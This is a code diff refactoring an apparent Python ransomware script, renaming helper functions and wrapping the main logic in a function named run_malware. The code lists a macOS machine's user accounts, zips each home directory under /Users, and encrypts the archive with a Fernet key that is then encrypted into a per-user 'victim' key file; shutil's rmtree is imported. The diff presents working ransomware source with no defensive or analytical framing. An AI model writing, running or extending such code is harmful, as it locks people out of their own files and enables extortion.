@@ -13,7 +13,7 @@ from shutil import rmtree
 from zipfile import ZipFile
 
 
-def zip_directory(path: str) -> str | None:
+def __zip_directory(path: str) -> str | None:
     # If path doesn't point to a directory, quit immediately
     if not isdir(path):
         print(f'Object at {path} is not a directory.')
@@ -34,7 +34,7 @@ def zip_directory(path: str) -> str | None:
     return zipped_file_path
 
 
-def encrypt_zip_file(zip_file_path: str, private_key_name: str, victim_key_name: str) -> None:
+def __encrypt_zip_file(zip_file_path: str, private_key_name: str, victim_key_name: str) -> None:
     # 1. Symmetric encryption of a file
     # Generate a Fernet key
     fernet_key = Fernet.generate_key()
@@ -72,9 +72,13 @@ def encrypt_zip_file(zip_file_path: str, private_key_name: str, victim_key_name:
         victim_key_file.write(encrypted_fernet_key)
 
 
-if __name__ == '__main__':
+def run_malware() -> None:
     user_directory_candidates = [user.pw_name for user in getpwall() if
                                  not user.pw_name.startswith('_') and user.pw_name not in ['root', 'daemon', 'nobody']]
     for user_directory in user_directory_candidates:
-        user_directory_zip_path = zip_directory(f'/Users/{user_directory}')
-        encrypt_zip_file(user_directory_zip_path, f'{user_directory}.private.pem', f'{user_directory}.pem')
+        user_directory_zip_path = __zip_directory(f'/Users/{user_directory}')
+        __encrypt_zip_file(user_directory_zip_path, f'{user_directory}.private.pem', f'{user_directory}.pem')
+
+
+if __name__ == '__main__':
+    run_malware()
